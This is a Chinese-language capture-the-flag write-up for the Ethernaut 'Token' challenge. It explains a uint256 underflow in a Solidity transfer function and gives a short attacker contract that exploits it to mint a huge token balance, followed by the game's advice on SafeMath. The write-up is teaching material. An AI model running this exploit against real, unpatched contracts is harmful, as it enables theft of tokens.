题目给的hint：

```
The goal of this level is for you to hack the basic token contract below.

You are given 20 tokens to start with and you will beat the level if you somehow manage to get your hands on any additional tokens. Preferably a very large amount of tokens.

  Things that might help:

What is an odometer?
```



solidity源码：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {
    mapping(address => uint256) balances;
    uint256 public totalSupply;

    constructor(uint256 _initialSupply) public {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }

    function balanceOf(address _owner) public view returns (uint256 balance) {
        return balances[_owner];
    }
}
```





这里考察的是 uint256的underflow即无符号整型的下溢。

所以require(balances[msg.sender] - _value >= 0); 始终会满足！！！

那么我们减去一个大数就会反过来得到一个正的大数。

```solidity
pragma solidity ^0.6.0;

import "./SafeMath.sol";

interface IToken {
    function transfer(address _to, uint256 _value) external returns (bool);
}

contract Token {
    using SafeMath for uint256;
    address levelInstance;

    constructor(address _levelInstance) public {
        levelInstance = _levelInstance;
    }

    function claim() public {
        IToken(levelInstance).transfer(msg.sender, 999999999999999);
    }
}
```

部署到 instance的地址





发现自己对于interface的用法还是不怎么会。

可以理解成：就是用来调用同一网络上的其它已部署的合约的方法。



```
Overflows are very common in solidity and must be checked for with control statements such as:

if(a + c > a) {
  a = a + c;
}
An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:

a = a.add(c);
If there is an overflow, the code will revert.
```

